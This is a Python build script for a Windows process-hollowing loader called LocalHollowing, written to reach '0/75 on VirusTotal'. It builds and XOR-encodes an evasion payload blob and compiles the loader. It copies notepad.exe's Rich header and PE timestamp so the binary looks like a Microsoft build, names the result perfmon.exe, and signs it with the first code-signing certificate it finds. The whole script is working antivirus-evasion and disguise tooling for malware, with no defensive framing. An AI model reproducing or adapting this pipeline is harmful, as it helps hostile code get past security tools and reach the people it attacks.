"""
Build script for the 0/75 VT configuration.
Steps: Build (CFG + Windows subsystem) -> Rich header swap -> Sign -> Verify
"""

import subprocess, sys, os, hashlib, shutil, glob, struct

PROJECT = r"C:\Users\chems\Desktop\01_Cyber\localhollowing\LocalHollowing"
MSBUILD = r"C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe"
VCXPROJ = os.path.join(PROJECT, "LocalHollowing.vcxproj")
EXE = os.path.join(PROJECT, "x64", "Release", "LocalHollowing.exe")
FINAL = os.path.join(os.path.dirname(PROJECT), "perfmon.exe")

def log(msg):
    print(f"[+] {msg}", flush=True)

def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for c in iter(lambda: f.read(8192), b""):
            h.update(c)
    return h.hexdigest()

def build():
    log("Building with CFG + Windows subsystem...")
    r = subprocess.run([MSBUILD, VCXPROJ, "/p:Configuration=Release", "/p:Platform=x64",
                        "/p:PlatformToolset=v143", "/t:Rebuild", "/verbosity:quiet"],
                       capture_output=True, text=True, timeout=180)
    if r.returncode != 0:
        print(f"[!] Build failed: {r.stderr[-500:]}")
        return False
    log(f"Build OK: {os.path.getsize(EXE) // 1024} KB")
    return True

def stamp_rich_header(exe_path):
    donor_path = r"C:\Windows\System32\notepad.exe"
    log(f"Swapping Rich header from {os.path.basename(donor_path)}...")

    with open(donor_path, "rb") as f:
        donor = f.read()
    rich_sig = b'Rich'
    rich_end = donor.find(rich_sig)
    if rich_end < 0:
        log("No Rich header in donor")
        return
    rich_end += 8
    xor_key = struct.unpack_from('<I', donor, rich_end - 4)[0]
    dans_marker = struct.pack('<I', 0x536E6144 ^ xor_key)
    rich_start = donor.find(dans_marker)
    if rich_start < 0:
        return
    donor_rich = donor[rich_start:rich_end]

    with open(exe_path, "rb") as f:
        data = bytearray(f.read())
    our_rich_end_idx = data.find(rich_sig)
    if our_rich_end_idx < 0:
        return
    our_rich_end = our_rich_end_idx + 8
    our_xor_key = struct.unpack_from('<I', data, our_rich_end - 4)[0]
    our_dans = struct.pack('<I', 0x536E6144 ^ our_xor_key)
    our_rich_start = data.find(our_dans)
    if our_rich_start < 0:
        return

    if len(donor_rich) <= our_rich_end - our_rich_start:
        data[our_rich_start:our_rich_start + len(donor_rich)] = donor_rich
        for i in range(our_rich_start + len(donor_rich), our_rich_end):
            data[i] = 0
        with open(exe_path, "wb") as f:
            f.write(data)
        log("Rich header swapped")

def sign_binary(exe_path):
    log("Signing binary...")
    found = sorted(glob.glob(r"C:\Program Files (x86)\Windows Kits\10\bin\*\x64\signtool.exe"), reverse=True)
    if not found:
        print("[!] signtool.exe not found")
        return False
    signtool = found[0]
    r = subprocess.run(["powershell", "-NoProfile", "-Command",
                        "Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert | Select-Object -First 1 -ExpandProperty Thumbprint"],
                       capture_output=True, text=True, timeout=15)
    thumbprint = r.stdout.strip()
    if not thumbprint:
        print("[!] No code signing cert found")
        return False
    r = subprocess.run([signtool, "sign", "/fd", "SHA256", "/sha1", thumbprint, exe_path],
                       capture_output=True, text=True, timeout=30)
    if r.returncode == 0:
        log("Signed OK")
        return True
    print(f"[!] Signing failed: {r.stderr}")
    return False

def build_evasion():
    log("Building evasion payload blob...")
    r = subprocess.run([sys.executable, "build_evasion.py"],
                       capture_output=True, text=True, timeout=60)
    print(r.stdout, end="")
    if r.returncode != 0:
        print(f"[!] Evasion build failed: {r.stderr}")
        return False
    return True

def build_cipher():
    blob = os.path.join("LocalHollowing", "evasion_blob.bin")
    bak = "cipher_pe_only.bak"
    out = "cipher.bin"
    if not os.path.exists(blob) or not os.path.exists(bak):
        return
    ev = open(blob, "rb").read()
    raw = bytes(b ^ 0xBE for b in ev[4:])
    ci = open(bak, "rb").read()
    with open(out, "wb") as f:
        f.write(struct.pack("<I", len(raw)))
        f.write(raw)
        f.write(ci)
    log(f"cipher.bin: {len(raw)} evasion + {len(ci)} PE")

def main():
    log("=== LocalHollowing 0/75 Build ===")

    if not build_evasion():
        return
    build_cipher()

    if not build():
        return

    shutil.copy2(EXE, FINAL)
    stamp_rich_header(FINAL)
    # Copy PE timestamp from notepad.exe (makes binary look like a legit MS build)
    with open(r"C:\Windows\System32\notepad.exe", "rb") as f:
        npad = f.read()
    npad_elf = struct.unpack_from("<I", npad, 0x3C)[0]
    npad_ts = npad[npad_elf+8:npad_elf+12]
    with open(FINAL, "r+b") as f:
        data = f.read()
        elf = struct.unpack_from("<I", data, 0x3C)[0]
        f.seek(elf+8)
        f.write(npad_ts)
    log(f"PE timestamp set to notepad's: 0x{struct.unpack('<I', npad_ts)[0]:08X}")
    sign_binary(FINAL)

    sz = os.path.getsize(FINAL)
    h = sha256(FINAL)
    log(f"Output: {FINAL}")
    log(f"Size: {sz // 1024} KB | SHA256: {h}")
    log("Configuration: PEB walk + CFG + WinMain + Contoso resource + Rich(notepad) + signed")
    log("Expected: 0/75 on VirusTotal")

if __name__ == "__main__":
    main()
